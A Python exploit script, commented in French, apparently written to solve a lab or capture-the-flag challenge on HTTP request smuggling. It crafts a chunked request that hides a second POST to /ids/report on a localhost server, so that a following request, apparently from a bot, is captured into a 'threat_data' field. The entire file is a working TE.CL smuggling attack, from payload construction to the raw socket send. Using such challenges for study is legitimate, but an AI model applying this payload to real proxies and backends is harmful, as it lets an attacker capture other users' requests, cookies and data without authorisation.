#!/usr/bin/env python3
"""
Exploit pour Challenge 2: TE.CL
Le frontend utilise Transfer-Encoding, le backend utilise Content-Length
"""
import socket
import time

def exploit_te_cl():
    # Payload à smuggler
    smuggled = (
        "POST /ids/report HTTP/1.1\r\n"
        "Host: localhost:8888\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 1500\r\n"
        "\r\n"
        "threat_data="
    )
    
    chunk_size = len(smuggled.encode())
    hex_size = hex(chunk_size)[2:]  # Conversion en hexadécimal sans '0x'
    
    # Construction de la requête complète
    # Le frontend lit Transfer-Encoding et traite tout le chunk
    # Le backend lit Content-Length: 4 (juste "85\r\n") et laisse le reste en buffer
    payload = (
        "POST / HTTP/1.1\r\n"
        "Host: localhost:3000\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n" +
        f"{hex_size}\r\n" +
        smuggled +
        "\r\n0\r\n"
        "\r\n"
    )
    
    print("[*] Challenge 2: TE.CL")
    print(f"[*] Taille du payload smugglé: {chunk_size} bytes (0x{hex_size})")
    print("[*] Envoi de la requête d'attaque...")
    
    try:
        # Connexion au serveur
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('localhost', 3000))
        s.sendall(payload.encode())
        
        # Lecture de la réponse
        response = s.recv(4096)
        print(f"[+] Réponse reçue: {response.decode(errors='ignore').split(chr(10))[0]}")
        s.close()
        
        print("[*] Attente du bot (5 secondes)...")
        time.sleep(5)
        
        print("[+] Exploit envoyé!")
        print("[*] Vérifiez le dashboard: http://localhost:3000/ids/dashboard")
        
    except Exception as e:
        print(f"[!] Erreur: {e}")

if __name__ == "__main__":
    exploit_te_cl()
